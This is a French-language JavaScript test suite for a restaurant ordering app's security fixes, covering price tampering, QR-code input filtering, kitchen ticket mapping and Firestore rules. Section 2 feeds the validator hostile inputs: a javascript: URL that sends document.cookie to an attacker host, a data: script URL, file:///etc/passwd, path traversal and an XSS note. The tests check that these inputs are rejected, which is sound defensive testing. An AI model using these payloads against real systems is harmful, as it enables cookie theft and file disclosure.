/**
 * RESTAUMAX — Tests unitaires et d'intégration automatisés pour le LOT 2
 *
 * Vérifie rigoureusement les 6 corrections du Lot 2 :
 * - CORRECTION A : Intégrité des prix, validation stricte et protection anti-doublon
 * - CORRECTION B : Validation stricte des entrées QR et rejet des tiers/schémas malveillants
 * - CORRECTION C : Transmission KDS persistante, correspondance de statut et déduplication
 * - CORRECTION D : Règles de sécurité Firestore multitenant et restriction des modifications
 * - CORRECTION E : Gestion exclusive des tables réelles sans données factices de repli
 */

import { 
  calculateItemUnitPrice, 
  calculateOrderTotal, 
  validateAndBuildOrder,
  generateTableQrUrl,
  parseAndValidateQrInput,
  sanitizeNote,
  clearOrderSubmissionCache
} from '../src/utils/pricing.js';

import {
  getNormalizedOptionSignature,
  getNormalizedExtrasSignature,
  areCartConfigurationsEqual
} from '../src/components/restaumax/ClientMenuView.js';

import { mapRestauOrderToKitchenTicket } from '../src/App.js';
import fs from 'node:fs';
import path from 'node:path';

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

function assert(condition, message) {
  totalTests++;
  if (condition) {
    passedTests++;
    console.log(`  ✓ ${message}`);
  } else {
    failedTests++;
    console.error(`  ✗ ÉCHEC : ${message}`);
  }
}

async function runTests() {
  console.log('====================================================');
  console.log('RESTAUMAX — VALIDATION COMPLÈTE DU LOT 2');
  console.log('====================================================\n');

  // Catalogue de test complet Chez Awa avec groupes d'options et extras réels
  const mockCatalog = [
    {
      id: 'dish-capitaine',
      restaurantSlug: 'chez-awa',
      name: 'Capitaine Braisé au Feu de Bois',
      category: 'grillades',
      price: 14500,
      description: 'Poisson capitaine entier',
      imageUrl: 'https://example.com/capitaine.jpg',
      available: true,
      prepTimeMinutes: 20,
      optionGroups: [
        {
          id: 'grp-acc',
          name: 'Choix d’accompagnement',
          required: true,
          options: [
            { id: 'opt-attieke', name: 'Attiéké de Grand-Bassam', extraPrice: 0, isDefault: true },
            { id: 'opt-alloco', name: 'Alloco Banane Plantain', extraPrice: 500 },
            { id: 'opt-riz', name: 'Riz Blanc Parfumé', extraPrice: 0 }
          ]
        }
      ],
      availableExtras: [
        { id: 'ext-piment', name: 'Sauce piment maison', price: 300 },
        { id: 'ext-oignons', name: 'Double oignons braisés', price: 400 }
      ]
    },
    {
      id: 'dish-poulet',
      restaurantSlug: 'chez-awa',
      name: 'Poulet Bicyclette Braisé Entier',
      category: 'grillades',
      price: 9500,
      description: 'Poulet fermier',
      imageUrl: 'https://example.com/poulet.jpg',
      available: true,
      prepTimeMinutes: 15,
      optionGroups: [],
      availableExtras: [
        { id: 'ext-piment', name: 'Sauce piment maison', price: 300 }
      ]
    },
    {
      id: 'dish-autre-resto',
      restaurantSlug: 'le-safari', // Appartient à un autre restaurant
      name: 'Burger Safari',
      category: 'plats',
      price: 6000,
      description: 'Burger du Safari',
      imageUrl: '',
      available: true,
      prepTimeMinutes: 10
    },
    {
      id: 'dish-rupture',
      restaurantSlug: 'chez-awa',
      name: 'Langouste Braisée Royale (Rupture)',
      category: 'grillades',
      price: 25000,
      description: 'Langouste fraîche',
      imageUrl: 'https://example.com/langouste.jpg',
      available: false, // Plat explicitement indisponible
      prepTimeMinutes: 25
    }
  ];

  const mockRealTables = [
    { id: 'tbl-1', tableNumber: '1', section: 'salle', capacity: 2, isActive: true },
    { id: 'tbl-4', tableNumber: '4', section: 'salle', capacity: 4, isActive: true },
    { id: 'tbl-5', tableNumber: '5', section: 'terrasse', capacity: 4, isActive: false } // Inactive
  ];

  // ==========================================================================
  // SECTION 1 : CORRECTION A — Intégrité des prix et validation de commande
  // ==========================================================================
  console.log('--- SECTION 1 : CORRECTION A — Intégrité des prix & Validation ---');

  // Test 1.1: Rejet d'un plat appartenant à un autre restaurant
  const resCrossTenant = validateAndBuildOrder({
    cart: [{
      menuItemId: 'dish-autre-resto',
      name: 'Burger Safari',
      basePrice: 6000,
      unitPrice: 6000,
      quantity: 1,
      selectedExtras: [],
      imageUrl: ''
    }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null
  });
  assert(resCrossTenant.success === false, 'Rejette un plat appartenant à un autre restaurant (anti cross-tenant)');

  // Test 1.2: Rejet d'un plat en rupture de stock (available: false)
  const resRupture = validateAndBuildOrder({
    cart: [{
      menuItemId: 'dish-rupture',
      name: 'Langouste',
      basePrice: 25000,
      unitPrice: 25000,
      quantity: 1,
      selectedExtras: [],
      imageUrl: ''
    }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null
  });
  assert(resRupture.success === false, 'Rejette formellement un plat en rupture');

  // Test 1.3: Exigence d'une option obligatoire
  const resMissingOption = validateAndBuildOrder({
    cart: [{
      menuItemId: 'dish-capitaine',
      name: 'Capitaine',
      basePrice: 14500,
      unitPrice: 14500,
      quantity: 1,
      selectedExtras: [],
      imageUrl: ''
      // Absence de selectedOption alors que required: true
    }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null
  });
  assert(resMissingOption.success === false, 'Rejette la commande lorsqu\'une option obligatoire est omise');

  // Test 1.4: Falsification du prix d'une option par le client
  const resTamperedOption = validateAndBuildOrder({
    cart: [{
      menuItemId: 'dish-capitaine',
      name: 'Capitaine',
      basePrice: 14500,
      unitPrice: 14500,
      quantity: 1,
      selectedOption: {
        groupId: 'grp-acc',
        groupName: 'Choix d’accompagnement',
        optionId: 'opt-alloco',
        optionName: 'Alloco Banane Plantain',
        extraPrice: 0 // Client tente de mettre 0 au lieu des 500 du catalogue
      },
      selectedExtras: [],
      imageUrl: ''
    }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null
  });
  assert(resTamperedOption.success === true, 'Valide la commande avec option');
  // Le prix unitaire doit être 14500 + 500 (catalogue) = 15000
  assert(resTamperedOption.order?.items[0].unitPrice === 15000, `Prix de l'option écrasé par le catalogue (15000 FCFA vs 14500 tenté) : ${resTamperedOption.order?.items[0].unitPrice}`);

  // Test 1.5: Falsification du prix d'un extra par le client
  const resTamperedExtra = validateAndBuildOrder({
    cart: [{
      menuItemId: 'dish-capitaine',
      name: 'Capitaine',
      basePrice: 14500,
      unitPrice: 14500,
      quantity: 1,
      selectedOption: {
        groupId: 'grp-acc',
        groupName: 'Choix d’accompagnement',
        optionId: 'opt-attieke',
        optionName: 'Attiéké',
        extraPrice: 0
      },
      selectedExtras: [
        { extraId: 'ext-piment', name: 'Sauce piment', price: 10 } // Client tente 10 au lieu de 300
      ],
      imageUrl: ''
    }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null
  });
  assert(resTamperedExtra.success === true, 'Valide la commande avec extra');
  // 14500 + 0 + 300 = 14800
  assert(resTamperedExtra.order?.totalAmount === 14800, `Prix de l'extra écrasé par le catalogue (14800 FCFA vs 14510 tenté) : ${resTamperedExtra.order?.totalAmount}`);

  // Test 1.6: Extra non existant au catalogue
  const resUnknownExtra = validateAndBuildOrder({
    cart: [{
      menuItemId: 'dish-capitaine',
      name: 'Capitaine',
      basePrice: 14500,
      unitPrice: 14500,
      quantity: 1,
      selectedOption: { groupId: 'grp-acc', groupName: 'Acc', optionId: 'opt-attieke', optionName: 'Attiéké', extraPrice: 0 },
      selectedExtras: [{ extraId: 'ext-inconnu', name: 'Or en poudre', price: 5000 }],
      imageUrl: ''
    }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null
  });
  assert(resUnknownExtra.success === false, 'Rejette un extra non défini au catalogue');

  // Test 1.7: Rejet des quantités invalides (non entières ou hors limites)
  const resFloatQty = validateAndBuildOrder({
    cart: [{ menuItemId: 'dish-poulet', name: 'Poulet', basePrice: 9500, unitPrice: 9500, quantity: 2.5, selectedExtras: [], imageUrl: '' }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null
  });
  assert(resFloatQty.success === false, 'Rejette une quantité flottante (2.5)');

  const resZeroQty = validateAndBuildOrder({
    cart: [{ menuItemId: 'dish-poulet', name: 'Poulet', basePrice: 9500, unitPrice: 9500, quantity: 0, selectedExtras: [], imageUrl: '' }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null
  });
  assert(resZeroQty.success === false, 'Rejette une quantité égale à zéro');

  const resHugeQty = validateAndBuildOrder({
    cart: [{ menuItemId: 'dish-poulet', name: 'Poulet', basePrice: 9500, unitPrice: 9500, quantity: 51, selectedExtras: [], imageUrl: '' }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null
  });
  assert(resHugeQty.success === false, 'Rejette une quantité dépassant le plafond de 50');

  // Test 1.8: Assainissement et limitation des notes de préparation (max 150 caractères, anti-XSS)
  const longNote = 'A'.repeat(200);
  const sanitized = sanitizeNote(`<script>alert('xss')</script>${longNote}`, 150);
  assert(sanitized !== undefined && sanitized.length <= 150, `Limite la note à 150 caractères : ${sanitized?.length}`);
  assert(!sanitized?.includes('<script>'), 'Supprime les balises HTML/XSS des notes');

  // Test 1.9: Vérification de la table réelle et rejet de table inexistante ou inactive
  const resInactiveTable = validateAndBuildOrder({
    cart: [{ menuItemId: 'dish-poulet', name: 'Poulet', basePrice: 9500, unitPrice: 9500, quantity: 1, selectedExtras: [], imageUrl: '' }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'sur_place',
    tableNumber: '5', // Table 5 est inactive dans mockRealTables
    allowedTables: mockRealTables
  });
  assert(resInactiveTable.success === false, 'Rejette une commande sur place sur une table inactive');

  const resUnknownTable = validateAndBuildOrder({
    cart: [{ menuItemId: 'dish-poulet', name: 'Poulet', basePrice: 9500, unitPrice: 9500, quantity: 1, selectedExtras: [], imageUrl: '' }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'sur_place',
    tableNumber: '99', // Inexistante
    allowedTables: mockRealTables
  });
  assert(resUnknownTable.success === false, 'Rejette une commande sur place sur une table inexistante');

  // Test 1.10: Protection anti double-soumission (idempotence)
  clearOrderSubmissionCache();
  const orderPayload = {
    cart: [{ menuItemId: 'dish-poulet', name: 'Poulet', basePrice: 9500, unitPrice: 9500, quantity: 1, selectedExtras: [], imageUrl: '' }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'sur_place',
    tableNumber: '4',
    allowedTables: mockRealTables,
    idempotencyKey: 'idem-test-123'
  };
  const sub1 = validateAndBuildOrder(orderPayload);
  assert(sub1.success === true, 'Première soumission acceptée');

  const sub2 = validateAndBuildOrder(orderPayload);
  assert(sub2.success === false, 'Seconde soumission immédiate bloquée par l\'idempotence');

  // ==========================================================================
  // SECTION 2 : CORRECTION B — Validation stricte des entrées QR
  // ==========================================================================
  console.log('\n--- SECTION 2 : CORRECTION B — Sécurité et filtrage QR Scanner ---');

  // Test 2.1: Rejet strict des domaines tiers non autorisés
  const resEvilDomain = parseAndValidateQrInput('https://evil-phishing.com/r/chez-awa?table=4', {
    defaultSlug: 'chez-awa',
    allowedOrigins: ['https://restaumax.app']
  });
  assert(resEvilDomain.isValid === false, 'Rejette un domaine tiers non autorisé même si le chemin est /r/chez-awa');

  // Test 2.2: Rejet des schémas interdits (javascript:, data:, file:)
  const resJsScheme = parseAndValidateQrInput('javascript:fetch("https://attacker.com/"+document.cookie)');
  assert(resJsScheme.isValid === false, 'Rejette formellement le protocole javascript:');

  const resDataScheme = parseAndValidateQrInput('data:text/html,<script>evil()</script>');
  assert(resDataScheme.isValid === false, 'Rejette formellement le protocole data:');

  const resFileScheme = parseAndValidateQrInput('file:///etc/passwd');
  assert(resFileScheme.isValid === false, 'Rejette formellement le protocole file:');

  // Test 2.3: Rejet des identifiants dans l'URL (credentials)
  const resCredentials = parseAndValidateQrInput('https://admin:secret@restaumax.app/r/chez-awa?table=4', {
    allowedOrigins: ['https://restaumax.app']
  });
  assert(resCredentials.isValid === false, 'Rejette une URL contenant des identifiants d\'authentification');

  // Test 2.4: Rejet des chemins arbitraires non autorisés
  const resAdminPath = parseAndValidateQrInput('/gestion/settings');
  assert(resAdminPath.isValid === false, 'Rejette un chemin hors périmètre (/gestion/settings)');

  const resTraversePath = parseAndValidateQrInput('/r/chez-awa/../../admin');
  assert(resTraversePath.isValid === false, 'Rejette les tentatives de path traversal');

  // Test 2.5: Validation du numéro de table (longueur et caractères)
  const resBadTableChars = parseAndValidateQrInput('/r/chez-awa?table=<script>');
  assert(resBadTableChars.isValid === false, 'Rejette un numéro de table avec balises script');

  const resTooLongTable = parseAndValidateQrInput('/r/chez-awa?table=' + 'A'.repeat(25));
  assert(resTooLongTable.isValid === false, 'Rejette un identifiant de table supérieur à 20 caractères');

  // Test 2.6: URL valide relative et absolue sur domaine autorisé
  const resValidRelative = parseAndValidateQrInput('/r/chez-awa?table=4');
  assert(resValidRelative.isValid === true && resValidRelative.tableNumber === '4', 'Accepte une URL relative valide /r/chez-awa?table=4');

  const resValidAbsolute = parseAndValidateQrInput('https://restaumax.app/r/chez-awa?table=Terrasse%20B', {
    allowedOrigins: ['https://restaumax.app']
  });
  assert(resValidAbsolute.isValid === true && resValidAbsolute.tableNumber === 'Terrasse B', 'Accepte une URL absolue sur domaine autorisé avec espace encodé');

  // ==========================================================================
  // SECTION 3 : CORRECTION C — Transmission KDS persistante et déduplication
  // ==========================================================================
  console.log('\n--- SECTION 3 : CORRECTION C — KDS Persistant & Correspondance des statuts ---');

  const mockOrder = {
    id: 'ord-test-kds-1',
    orderNumber: '#CMD-742',
    restaurantSlug: 'chez-awa',
    orderMode: 'sur_place',
    tableNumber: '4',
    items: [
      {
        id: 'line-1',
        menuItemId: 'dish-capitaine',
        name: 'Capitaine Braisé au Feu de Bois',
        basePrice: 14500,
        unitPrice: 15000,
        quantity: 2,
        totalPrice: 30000,
        selectedOption: {
          groupId: 'grp-acc',
          groupName: 'Accompagnement',
          optionId: 'opt-alloco',
          optionName: 'Alloco Banane Plantain',
          extraPrice: 500
        },
        selectedExtras: [
          { extraId: 'ext-piment', name: 'Sauce piment maison', price: 300 }
        ],
        prepNotes: 'Bien pimenté'
      }
    ],
    itemsCount: 2,
    totalAmount: 30600,
    currency: 'FCFA',
    status: 'pending',
    createdAt: Date.now(),
    createdAtIso: new Date().toISOString()
  };

  // Test 3.1: Mapping stable d'un ordre Firestore vers un ticket KDS
  const ticket1 = mapRestauOrderToKitchenTicket(mockOrder);
  assert(ticket1.id === 'ord-ord-test-kds-1', `ID du ticket KDS stable : ${ticket1.id}`);
  assert(ticket1.ticketNumber === '#CMD-742', 'Numéro de commande KDS exact');
  assert(ticket1.tableNumber === 'Table 4', 'Emplacement table correctement formatté');
  assert(ticket1.status === 'in_prep', 'Statut "pending" mappé vers "in_prep" pour la cuisine');
  assert(ticket1.items[0].name === 'Capitaine Braisé au Feu de Bois', 'Ligne plat préservée');
  assert(ticket1.items[0].notes.includes('Alloco'), 'Notes d\'options incluses dans le ticket KDS');

  // Test 3.2: Mapping avec statut 'ready' et 'completed'
  const ticketReady = mapRestauOrderToKitchenTicket({ ...mockOrder, status: 'ready' });
  assert(ticketReady.status === 'ready', 'Statut "ready" correctement préservé pour le KDS');

  const ticketCompleted = mapRestauOrderToKitchenTicket({ ...mockOrder, status: 'completed' });
  assert(ticketCompleted.status === 'served', 'Statut "completed" mappé vers "served" pour le KDS');

  // Test 3.3: Préservation de l'état des items cochés en cuisine lors des mises à jour du flux
  const ticketWithCompletedItem = {
    ...ticket1,
    items: ticket1.items.map(i => ({ ...i, completed: true }))
  };
  const updatedFromFirestore = mapRestauOrderToKitchenTicket(mockOrder, ticketWithCompletedItem);
  assert(updatedFromFirestore.items[0].completed === true, 'Préserve l\'état coché des plats lors d\'un re-render ou snapshot Firestore');

  // ==========================================================================
  // SECTION 4 : CORRECTION D — Vérification structurelle des règles Firestore
  // ==========================================================================
  console.log('\n--- SECTION 4 : CORRECTION D — Sécurisation Firestore Multi-tenant ---');

  const rulesContent = fs.readFileSync(path.resolve('firestore.rules'), 'utf-8');

  // Test 4.1: Vérification de la fonction scoped isManagerOfRestaurant
  assert(rulesContent.includes('isManagerOfRestaurant(targetSlug)'), 'Définit la fonction de vérification avec portée restaurant (isManagerOfRestaurant)');

  // Test 4.2: Protection multi-tenant sur restaurants et sous-collections
  assert(rulesContent.includes('allow create: if isManagerOfRestaurant(restaurantSlug)'), 'Écritures restaurants restreintes au gérant autorisé');
  assert(rulesContent.includes('allow list: if isManagerOfRestaurant(restaurantSlug);'), 'Liste des commandes privée et réservée au gérant du restaurant');

  // Test 4.3: Restriction stricte des modifications d'ordres KDS
  assert(rulesContent.includes('affectedKeys().hasOnly([\'status\', \'statusUpdatedAt\', \'kitchenNotes\'])'), 'Mise à jour de commande limitée strictement aux statuts opérationnels');
  assert(rulesContent.includes('incoming().totalAmount == existing().totalAmount'), 'Empêche toute altération du montant après commande');

  // ==========================================================================
  // SECTION 5 : CORRECTION E — Tables réelles uniquement dans le générateur QR
  // ==========================================================================
  console.log('\n--- SECTION 5 : CORRECTION E — Générateur QR sans tables factices ---');

  const qrViewContent = fs.readFileSync(path.resolve('src/components/restaumax/TableQrGeneratorView.tsx'), 'utf-8');

  // Test 5.1: Suppression de DEFAULT_SAMPLE_TABLES
  assert(!qrViewContent.includes('DEFAULT_SAMPLE_TABLES'), 'DEFAULT_SAMPLE_TABLES définitivement éradiqué du composant');

  // Test 5.2: Présence d'un état vide explicite
  assert(qrViewContent.includes('tableList.length === 0'), 'Gère explicitement la collection de tables vide');
  assert(qrViewContent.includes('Aucune table configurée'), 'Affiche un message clair en cas d\'absence de tables');

  // ==========================================================================
  // BILAN GÉNÉRAL LOT 2
  // ==========================================================================
  console.log('\n====================================================');
  console.log(`RÉSULTATS VALIDATION LOT 2 : ${passedTests}/${totalTests} tests réussis (${failedTests} échecs)`);
  console.log('====================================================');

  if (failedTests > 0) {
    process.exit(1);
  }
}

runTests().catch((err) => {
  console.error('Erreur inattendue durant les tests du Lot 2 :', err);
  process.exit(1);
});
